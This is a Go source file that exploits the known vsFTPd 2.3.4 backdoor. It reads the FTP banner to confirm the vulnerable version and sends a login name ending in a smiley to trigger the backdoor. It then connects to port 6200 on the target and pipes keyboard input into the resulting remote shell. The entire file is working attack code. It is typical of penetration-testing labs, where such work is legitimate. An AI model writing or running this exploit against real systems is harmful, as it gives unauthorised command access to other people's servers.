package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	// Check if the command-line argument is provided
	if len(os.Args) != 2 {
		fmt.Println("Usage: go run main.go <ip_address>")
		os.Exit(1)
	}

	// Get the IP address from the command-line argument
	ipAddress := os.Args[1]

	// Parse the IP address
	parsedIP := net.ParseIP(ipAddress)
	if parsedIP == nil {
		fmt.Println("Invalid IP address")
		os.Exit(1)
	}

	// Display the parsed IP address
	fmt.Printf("Parsed IP address: %s\n", parsedIP)

	// Check is target vulnerable
	if !CheckIsTargetVulnerable(parsedIP) {
		return
	}
	fmt.Println("Target is vulnerable")

	SendSmileyPayload(parsedIP)
	fmt.Println("Smiley Payload Deployed")

	OpenShell(parsedIP)
}

///SHELL
////////

func OpenShell(ip net.IP) {
	conn, err := net.Dial("tcp", ip.String()+":6200")
	if err != nil {
		fmt.Println("Error connecting to shell:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Connected to shell on", ip.String()+":6200")

	// Create a bufio reader and writer for the connection
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)

	// Start a goroutine to handle incoming data from the shell
	go handleIncomingData(reader)

	// Start a loop to read user input and send it to the shell
	for {
		fmt.Print("")
		command, _ := bufio.NewReader(os.Stdin).ReadString('\n')

		// Send the command to the shell
		_, err := writer.WriteString(command)
		if err != nil {
			fmt.Println("Error writing to shell:", err)
			return
		}
		writer.Flush()
	}
}

func handleIncomingData(reader *bufio.Reader) {
	for {
		// Read data from the shell
		data, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from shell:", err)
			return
		}
		fmt.Print("", data)
	}
}

////////
///SHELL

func SendSmileyPayload(ip net.IP) {
	conn, err := net.Dial("tcp", ip.String()+":21")
	if err != nil {
		fmt.Println("Error connecting to FTP server:", err)
		return
	}
	defer conn.Close()

	// Create a bufio reader and writer for the connection
	writer := bufio.NewWriter(conn)

	_, _ = fmt.Fprintf(writer, "%s\r\n", "user notthatimportant:)")
	_ = writer.Flush()

	_, _ = fmt.Fprintf(writer, "%s\r\n", "pass notthatimportant")
	_ = writer.Flush()

}

func CheckIsTargetVulnerable(ip net.IP) bool {

	// Connect to the FTP server
	conn, err := net.Dial("tcp", ip.String()+":21")
	if err != nil {
		fmt.Println("Error connecting to FTP server:", err)
		return false
	}
	defer conn.Close()

	// Read the initial welcome message
	response, err := readResponse(conn)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return false
	}

	if strings.Contains(response, "vsFTPd 2.3.4") {
		return true
	} else {
		return false
	}
}

func readResponse(conn net.Conn) (string, error) {
	// Create a buffered reader for reading lines
	reader := bufio.NewReader(conn)

	// Read the first line of the response
	line, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}

	return line, nil
}
